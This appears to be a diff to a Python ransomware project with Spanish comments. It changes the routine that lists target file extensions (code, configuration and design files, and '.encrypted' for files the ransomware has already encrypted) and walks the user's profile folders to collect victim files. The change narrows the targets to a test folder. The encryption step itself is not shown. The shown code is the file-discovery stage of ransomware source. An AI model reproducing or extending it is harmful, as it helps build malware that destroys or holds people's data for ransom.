@@ -12,7 +12,7 @@ def is_important_file(file):
         'code_files': ['.py', '.java', '.c', '.cpp', '.cs', '.js', '.html', '.css', '.php', '.swift', '.go', '.rs', '.ts'],
         'configuration_files': ['.ini', '.cfg', '.json', '.yaml', '.yml', '.toml', '.env'],
         'design_files': ['.psd', '.ai', '.xd', '.fig', '.sketch'],
-        'encrypted_extension': ['.encrypted'] # Extensión archivos cifrados por el ransomware
+        'encrypted_extension': ['.encrypted'] # Extensión archivos cifrados por el ransomware (descifrado)
     }
     _, extension = os.path.splitext(file) # Extraer extensión del archivo
     is_important = any(extension.lower() in ext_list for ext_list in extensions.values()) # Verificar si la extensión coincide 
@@ -20,23 +20,21 @@ def is_important_file(file):
 
 def find_files(): # Función que obtiene los directorios de interés y lo pasa a walk_directory
     user_directory = os.environ.get('USERPROFILE', None)
-    directories = [
+    target_directories = [
         #os.path.join(user_directory, 'Desktop'),
         os.path.join(user_directory, 'Desktop', 'Test'),
-        os.path.join(user_directory, 'Pictures'),
-        os.path.join(user_directory, 'Documents'),
+        #os.path.join(user_directory, 'Pictures'),
+        #os.path.join(user_directory, 'Documents'),
         #os.path.join(user_directory, 'Music'),
-        #os.path.join(user_directory, 'Videos')
-        #os.path.join(user_directory, 'Dowmloads')
+        #os.path.join(user_directory, 'Videos'),
+        #os.path.join(user_directory, 'Downloads')
     ]
-    files = walk_directory(directories)
+    files = walk_directory(target_directories)
     return files
 
-def walk_directory(directories):  # Recursively scans multiple directories and returns important files
+def walk_directory(target_directories):  # Recursively scans multiple directories and returns important files
     important_files = []
-    if isinstance(directories, str):  
-        directories = [directories]
-    for directory in directories:
+    for directory in target_directories:
         if os.path.exists(directory):
             for root, _, files in os.walk(directory):  # Recursively walk through the directory
                 for file in files:
